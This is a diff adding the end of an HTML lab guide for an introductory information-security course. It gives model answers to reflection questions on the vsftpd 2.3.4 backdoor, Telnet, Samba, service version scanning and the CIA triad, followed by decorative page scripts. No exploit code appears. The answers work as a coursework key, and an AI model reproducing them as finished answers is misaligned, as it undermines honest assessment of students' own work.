+      <div class="card">
+        <div class="card-title">Q1 — Vulnerability vs Threat</div>
+        <p style="font-style:italic; color:var(--text); font-size:1rem;">"A vulnerability is a weakness in a system that can be exploited, while a threat is the potential actor or action that takes advantage of that weakness. In our lab, the vulnerability was the backdoor in vsftpd 2.3.4 (CVE-2011-2523) since it was a flaw in the software itself. The threat was an attacker using Metasploit to exploit that backdoor and gain unauthorized root access."</p>
+      </div>
+
+      <div class="card">
+        <div class="card-title">Q2 — Why -sV is Critical</div>
+        <p style="font-style:italic; color:var(--text); font-size:1rem;">"Service version detection is critical because just knowing a port is open isn't enough — you need to know exactly what software and version is running to identify if it has known vulnerabilities. For example, without -sV we only saw that port 21 was running FTP, but with -sV we found out it was specifically vsftpd 2.3.4 which has a critical backdoor. Running outdated unpatched software means attackers can look up the exact CVE and exploit it easily, putting the whole organization at risk."</p>
+      </div>
+
+      <div class="card">
+        <div class="card-title">Q3 — "Excellent" Reliability Rating</div>
+        <p style="font-style:italic; color:var(--text); font-size:1rem;">"The 'excellent' reliability rating in Metasploit means the exploit works consistently without crashing or destabilizing the target service, making it very easy for even a beginner attacker to use successfully. From a risk perspective this is very serious because it means the vulnerability is not only real but also highly repeatable and reliable, so any attacker who finds vsftpd 2.3.4 running on a server can exploit it with almost guaranteed success."</p>
+      </div>
+
+      <div class="card">
+        <div class="card-title">Q4 — Telnet vs SSH</div>
+        <p style="font-style:italic; color:var(--text); font-size:1rem;">"Telnet is considered a security risk because it sends all data including usernames and passwords in plaintext over the network, meaning anyone who can intercept the traffic can read the credentials directly. SSH on the other hand encrypts all communication so even if someone intercepts the traffic they cannot read it. So even without a specific exploit, Telnet is dangerous simply because of how it was designed — it was never built with security in mind."</p>
+      </div>
+
+      <div class="card">
+        <div class="card-title">Q5 — Top 3 Priorities</div>
+        <p style="font-style:italic; color:var(--text); font-size:1rem;">"The three vulnerabilities I would prioritize first are vsftpd 2.3.4, Telnet, and Samba, since all three scored 9 (CRITICAL) on the risk matrix with both likelihood and impact rated at 3. The vsftpd backdoor is the most urgent since we already proved it gives full root access with no credentials needed. Telnet should be disabled immediately since it exposes credentials to anyone on the network. Samba's CVE-2007-2447 also allows remote code execution which means an attacker can take over the machine without even needing FTP access."</p>
+      </div>
+
+      <div class="card">
+        <div class="card-title">Q6 — CIA Triad</div>
+        <p style="font-style:italic; color:var(--text); font-size:1rem;">"All three components of the CIA Triad are threatened by our findings. Confidentiality is violated because root access allows an attacker to read any file on the system including sensitive data and password hashes. Integrity is threatened because with root access an attacker can modify, delete, or plant files without any restriction. Availability is also at risk since the attacker could shut down services or the entire machine. The vsftpd backdoor alone is enough to compromise all three, making it the most critical finding of the assessment."</p>
+      </div>
+
+      <div class="note-box" style="margin-top:1.5rem;">
+        <span class="icon">✦</span>
+        <p>Remember to rewrite the answers in your own words — these are guides, not copy-paste answers! Madam Herta would be disappointed otherwise.</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- FOOTER -->
+<footer>
+  <div class="divider"><span class="divider-icon">✦</span></div>
+  <p class="footer-title">The Herta approves.</p>
+  <p>Made with <span class="heart">♥</span> for InfoSec Lab 01 — For educational use only.</p>
+  <p style="margin-top:0.5rem; font-size:0.8rem;">All activities must be performed in an authorized lab environment only.</p>
+</footer>
+
+<script>
+  // Custom cursor
+  const cursor = document.getElementById('cursor');
+  const ring = document.getElementById('cursorRing');
+  document.addEventListener('mousemove', e => {
+    cursor.style.left = e.clientX + 'px';
+    cursor.style.top = e.clientY + 'px';
+    setTimeout(() => {
+      ring.style.left = e.clientX + 'px';
+      ring.style.top = e.clientY + 'px';
+    }, 80);
+  });
+
+  // Stars
+  const starsEl = document.getElementById('stars');
+  for (let i = 0; i < 120; i++) {
+    const s = document.createElement('div');
+    s.className = 'star';
+    const size = Math.random() * 2.5 + 0.5;
+    s.style.cssText = `
+      width:${size}px; height:${size}px;
+      left:${Math.random()*100}%;
+      top:${Math.random()*100}%;
+      --dur:${Math.random()*4+2}s;
+      --op:${Math.random()*0.7+0.1};
+      animation-delay:${Math.random()*6}s;
+    `;
+    starsEl.appendChild(s);
+  }
+
+  // Progress bar
+  const bar = document.getElementById('progressBar');
+  window.addEventListener('scroll', () => {
+    const pct = window.scrollY / (document.body.scrollHeight - window.innerHeight) * 100;
+    bar.style.width = pct + '%';
+  });
+
+  // Intersection observer for step animations
+  const steps = document.querySelectorAll('.step-section');
+  const obs = new IntersectionObserver(entries => {
+    entries.forEach(e => { if (e.isIntersecting) e.target.classList.add('visible'); });
+  }, { threshold: 0.1 });
+  steps.forEach(s => obs.observe(s));
+
+  // Nav dots
+  const sections = [
+    { id: 'sec-hero', label: 'Top' },
+    { id: 'sec-setup', label: 'Setup' },
+    { id: 'sec-parta', label: 'Part A' },
+    { id: 'sec-partb', label: 'Part B' },
+    { id: 'sec-partc', label: 'Part C' },
+    { id: 'sec-reflect', label: 'Reflection' },
+  ];
+  const navDots = document.getElementById('navDots');
+  sections.forEach(sec => {
+    const dot = document.createElement('div');
+    dot.className = 'nav-dot';
+    dot.setAttribute('data-label', sec.label);
+    dot.onclick = () => document.getElementById(sec.id).scrollIntoView({ behavior: 'smooth' });
+    navDots.appendChild(dot);
+  });
+
+  const dots = document.querySelectorAll('.nav-dot');
+  const secEls = sections.map(s => document.getElementById(s.id));
+  window.addEventListener('scroll', () => {
+    let current = 0;
+    secEls.forEach((el, i) => {
+      if (el && el.getBoundingClientRect().top < window.innerHeight / 2) current = i;
+    });
+    dots.forEach((d, i) => d.classList.toggle('active', i === current));
+  });
+</script>
+</body>
+</html>
